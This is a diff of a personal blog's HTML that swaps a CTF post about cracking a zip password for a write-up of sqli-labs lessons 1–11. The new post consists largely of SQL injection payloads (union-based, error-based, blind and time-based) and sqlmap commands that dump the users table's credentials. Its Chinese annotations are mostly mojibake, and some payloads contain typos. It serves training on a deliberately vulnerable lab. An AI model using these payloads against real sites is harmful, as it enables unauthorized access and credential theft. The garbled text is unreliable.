@@ -4,11 +4,9 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="第一篇, LeLeLeL">
-    <meta name="description" content="BUUCTF中的一道题“二维码”
-把其中的文件改成.zip格式后，会出现一个带着4位数密码的压缩包文件。
-使用ARCHPR软件进行密码破解，会报错提示“选择的文件不是ZIP&amp;#x2F;RAR&amp;#x2F;ACE&amp;#x2F;ARJ档案文件”
-百">
+    <meta name="keywords" content="sqli-labs, LeLeLeL">
+    <meta name="description" content="less-1��������֪�����Ǳպϵ����š�
+1234?id=1&amp;#x27;order by 3 -- - #ȷ���Ǹ��ֶ��л���?id=-1&amp;#x27;union select 1,2,group_concat(ta">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -20,7 +18,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>第一篇 | LeLeLeL</title>
+    <title>sqli-labs | LeLeLeL</title>
     <link rel="icon" type="image/png" href="/favicon.png">
     
     <style>
@@ -346,12 +344,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/16.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">第一篇</h1>
+                    <h1 class="description center-align post-title">sqli-labs</h1>
                 </div>
             </div>
         </div>
@@ -373,12 +371,25 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                          <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
-                          </div>
+                    <div class="article-tag">
+                        
+                            <a href="/tags/sql%D7%A2%EF%BF%BD%EF%BF%BD/">
+                                <span class="chip bg-color">sqlע��</span>
+                            </a>
+                        
+                    </div>
                     
                 </div>
                 <div class="col s5 right-align">
+                    
+                    <div class="post-cate">
+                        <i class="fas fa-bookmark fa-fw icon-category"></i>
+                        
+                            <a href="/categories/web/" class="post-category">
+                                web
+                            </a>
+                        
+                    </div>
                     
                 </div>
             </div>
@@ -387,7 +398,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2023-02-01
+                    2023-02-20
                 </div>
                 
 
@@ -408,13 +419,36 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <p>BUUCTF中的一道题“二维码”<img src="https://huatu.bangongtuku.com/markdown/work/uploads/upload_11368a8b2f1a82fb7b20eb98938c59f0.jpg"></p>
-<p>把其中的文件改成.zip格式后，会出现一个带着4位数密码的压缩包文件。<img src="https://huatu.bangongtuku.com/markdown/work/uploads/upload_cf6763cf0678c4ea54fd20ef2acca883.png"></p>
-<p>使用ARCHPR软件进行密码破解，会报错提示“选择的文件不是ZIP&#x2F;RAR&#x2F;ACE&#x2F;ARJ档案文件”<br><img src="https://huatu.bangongtuku.com/markdown/work/uploads/upload_405eafb57bdb86f72aa3ff2ef0234330.png"></p>
-<p>百度后，网上的答案有的说是版本问题，于是重新下载了其他版本但还是这个情况。于是换了一个破解软件</p>
-<p><img src="https://huatu.bangongtuku.com/markdown/work/uploads/upload_98e7459626da085d7fccada25269c537.jpg"></p>
-<p>使用Ziperello软件破解后，没有报错，密码为“7639”<br><img src="https://huatu.bangongtuku.com/markdown/work/uploads/upload_856224f43e8f66ffd08c294ec67d8470.jpg"></p>
-<p>输入密码，得到flag<br><img src="https://huatu.bangongtuku.com/markdown/work/uploads/upload_a96f5fcc5d42e2e360515902caa01a6d.jpg"></p>
+                <h1 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h1><p><img src="/pic/sqli/1.png"><br>��������֪�����Ǳպϵ����š�</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;order by 3 -- - #ȷ���Ǹ��ֶ��л���</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- - #��ѯ����</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- -  #��ѯ����</span><br><span class="line">?id=-1&#x27;union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - #��ѯ��ǰ���ݿ�user�������username��password��</span><br></pre></td></tr></table></figure>
+<span id="more"></span>
+<p>��sqlmap����</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;ip?id=1&quot;</span><br><span class="line">sqlmap -u &quot;ip?id=1&quot; -dbs #�г��������ݿ�</span><br><span class="line">sqlmap -u &quot;ip?id=1&quot; -D security -tables #�г���ǰ���ݿ���ı�</span><br><span class="line">sqlmap -u &quot;ip?id=1&quot; -D security -T users -columns #�г��������</span><br><span class="line">sqlmap -u &quot;ip?id=1&quot; -D security -T users -C username,password --dump #��ȡ���������</span><br></pre></td></tr></table></figure>
+<h1 id="less-2"><a href="#less-2" class="headerlink" title="less-2"></a>less-2</h1><p><img src="/pic/sqli/2.png"><br>��һ��Ͳ��ñպϣ�ʣ�µĺ͵�һ��һ����</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1 order by 3 -- - </span><br><span class="line">?id=-1 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line">?id=-1 union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - </span><br><span class="line">?id=-1 union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - </span><br></pre></td></tr></table></figure>
+<h1 id="less-3"><a href="#less-3" class="headerlink" title="less-3"></a>less-3</h1><p><img src="/pic/sqli/3.png"><br>��������ʾ��֪����Ҫ��<code>&#39;)</code>���պϣ�ʣ�µĺ͵�һ��һ����</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27;) order by 3 -- - </span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - </span><br><span class="line">?id=-1&#x27;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - </span><br></pre></td></tr></table></figure>
+<h1 id="less-4"><a href="#less-4" class="headerlink" title="less-4"></a>less-4</h1><p><img src="/pic/sqli/4.png"><br>��������ʾ����֪�պϷ�ʽ��<code>&quot;)</code>�����ǵ����Ų��ᱨ��,ʣ�µĺ͵�һ��һ����</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=1&quot;) order by 3 -- - </span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;security&#x27; -- -</span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=&#x27;security&#x27; and table_name=&#x27;users&#x27; -- - </span><br><span class="line">?id=-1&quot;) union select 1,2,group_concat(username,&#x27;~&#x27;,password) from users -- - </span><br></pre></td></tr></table></figure>
+<h1 id="less-5"><a href="#less-5" class="headerlink" title="less-5"></a>less-5</h1><p><img src="/pic/sqli/5.png"><br>���ݴ�������ж��ǵ����ű���������ע��Ҳû�а취�ã�����ʹ�ñ���ע�롣<br>extractvalue����<br>payload:id&#x3D;’and(select extractvalue(“anything”,concat(‘~’,(select���))))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">����ԭ�ͣ�extractvalue(xml_document,Xpath_string)</span><br><span class="line">�����﷨��extractvalue(xml_document,Xpath_string);</span><br><span class="line">��һ��������xml_document��string��ʽ��Ϊxml�ĵ����������</span><br><span class="line">�ڶ���������Xpath_string��xpath��ʽ���ַ���</span><br><span class="line">���ã���Ŀ��xml�з��ذ�������ѯֵ���ַ���</span><br></pre></td></tr></table></figure>
+<p>payload��</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,(select database()))))-- - #��ȡ��ǰ���ݿ������</span><br><span class="line">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31))))-- -</span><br><span class="line">#��ѯ��ǰ���ݿ������еı�</span><br><span class="line">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),1,31))))-- -</span><br><span class="line">#��ѯ�����е�����</span><br><span class="line">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,31))))-- -</span><br><span class="line">#��ѯ�����������</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># extractvalue()��������ʾ����󳤶�Ϊ32��������substr()��������ҳ������ʹ��limit��ҳҲ���ԡ�concat()�����~Ҳ�����������ġ�</span><br></pre></td></tr></table></figure>
+
+<p>updatexml:<br>payload:id&#x3D;’and(select updatexml(“anything”,concat(‘~’,(select���())),”anything”))</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select database())),1)-- -</span><br><span class="line">?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(table_name)from information_schema.tables where table_schema=database() )),1)-- -</span><br><span class="line">?id=-1&#x27;and updatexml(1,concat(&#x27;~&#x27;,(select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27; )),1)-- -</span><br><span class="line">?id=-1&#x27;and (select extractvalue(1,concat(&quot;~&quot;,substr((select group_concat(username,&#x27;~&#x27;,password) from users),1,31))))-- -</span><br></pre></td></tr></table></figure>
+
+<p>floor:<br>payload:’union select 1 from (select count(*),concat((slelect���),floor(rand(0)*2))x from “һ�����ı�” group by x)a</p>
+<h1 id="less-6"><a href="#less-6" class="headerlink" title="less-6"></a>less-6</h1><p>�պϷ�ʽΪ<code>&quot;</code>������ע���Կ��С�</p>
+<h1 id="less-7"><a href="#less-7" class="headerlink" title="less-7"></a>less-7</h1><p>�ļ���дע�룬��������ô�����ļ�����д�룬�����ˡ�</p>
+<h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p>����äע��</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id=-1&#x27;and (ascii(substr(select database()),1,1))==115--+ #�жϵ�һ�����ݿ����ֵ�һ���ַ���ascii���Ƿ����115</span><br><span class="line">?id=1&#x27; and (ascii(substr((select database()) ,2,1))) = 101 --+ #�жϵ�һ�����ݿ����ֵڶ����ַ���ascii���Ƿ����101</span><br><span class="line">?id=1&#x27;and (length(database())) = 8 --+ #�ж����ݿ����ֵĳ����Ƿ����8</span><br><span class="line">?id=1&#x27;and (length(select table_name from information_schema.tables where table_schema=&#x27;security&#x27; limit 3,1)) = 5 --+ #�жϵ����ű����ֵĳ����Ƿ�Ϊ5</span><br><span class="line">?id=1&#x27; and (length((select column_name from information_schema.columns where table_name=&#x27;users&#x27; limit 1,1))) = 8 --+ #�ж�users����ض��������ĳ����Ƿ�Ϊ8</span><br></pre></td></tr></table></figure>
+<p>����ж���ȷ�Ļ���ҳ�淵��������<br>���鷳������������������������������������������</p>
+<h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>ʱ��äע</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; and if(length(database())&gt;3 ,sleep(5),1) -- - #������ݿⳤ�ȳ���3�Ļ����ӳ�5�뷵��ҳ�档</span><br></pre></td></tr></table></figure>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/forforever/p/13019703.html">MySQLʱ��äע������ʱ���� </a></p>
+<h1 id="less-10"><a href="#less-10" class="headerlink" title="less-10"></a>less-10</h1><p>����ʱ��äע���պϷ�ʽΪ<code>&quot;</code>��</p>
+<h1 id="less-11"><a href="#less-11" class="headerlink" title="less-11"></a>less-11</h1><p><img src="/pic/sqli/11.png"><br>�������username��ֱ������sql�����С�<br>Ҳ������hackbar��Post���Ρ�������䲻�䡣.</p>
 
                 
             </div>
@@ -441,7 +475,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2023/02/01/1/">http://example.com/2023/02/01/1/</a>
+                    <a href="http://example.com/2023/02/20/sqli-labs/">http://example.com/2023/02/20/sqli-labs/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -478,7 +512,11 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            <span class="chip bg-color">No tag</span>
+                            
+                                <a href="/tags/sql%D7%A2%EF%BF%BD%EF%BF%BD/">
+                                    <span class="chip bg-color">sqlע��</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -559,45 +597,32 @@
             <div class="article-badge left-badge text-color">
                 <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
             <div class="card">
-                <a href="/2023/02/20/sqli-labs/">
+                <a href="/2023/02/28/2/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/16.jpg" class="responsive-img" alt="sqli-labs">
+                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="第二篇">
                         
-                        <span class="card-title">sqli-labs</span>
+                        <span class="card-title">第二篇</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            less-1��������֪�����Ǳպϵ����š�
-1234?id=1&#x27;order by 3 -- - #ȷ���Ǹ��ֶ��л���?id=-1&#x27;union select 1,2,group_concat(ta
+                            
                         
                     </div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-20
+                            <i class="far fa-clock fa-fw icon-date"></i>2023-02-28
                         </span>
                         <span class="publish-author">
                             
-                            <i class="fas fa-bookmark fa-fw icon-category"></i>
-                            
-                            <a href="/categories/web/" class="post-category">
-                                    web
-                                </a>
-                            
+                            <i class="fas fa-user fa-fw"></i>
+                            John Doe
                             
                         </span>
                     </div>
-                </div>
-                
-                <div class="card-action article-tags">
-                    
-                    <a href="/tags/sql%D7%A2%EF%BF%BD%EF%BF%BD/">
-                        <span class="chip bg-color">sqlע��</span>
-                    </a>
-                    
                 </div>
                 
             </div>
@@ -606,7 +631,7 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                Current&nbsp;<i class="far fa-dot-circle"></i>
+                Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/2023/02/01/1/">
@@ -636,7 +661,6 @@
                         </span>
                     </div>
                 </div>
-
                 
             </div>
         </div>
